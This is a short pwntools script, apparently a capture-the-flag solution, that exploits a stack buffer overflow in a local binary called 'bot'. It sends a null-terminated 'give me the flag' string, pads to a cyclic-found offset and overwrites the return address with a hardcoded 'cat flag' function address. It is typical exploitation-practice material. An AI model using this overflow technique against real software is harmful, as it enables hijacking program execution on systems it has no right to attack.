import pwn
import sys

elf = pwn.ELF("./bot")
p=elf.process()

pwn.context.binary = elf
pwn.context.log_level = "DEBUG"
pwn.context(terminal=['tmux','split-window','-h'])

catflagaddr = 0x40129a

p.recvuntil(b"hi, how can i help?")
pwn.gdb.attach(p)
offset = pwn.cyclic_find("aoaa")
p.sendline(b"give me the flag\x00"+b'1'*offset+pwn.p64(catflagaddr))
p.interactive()
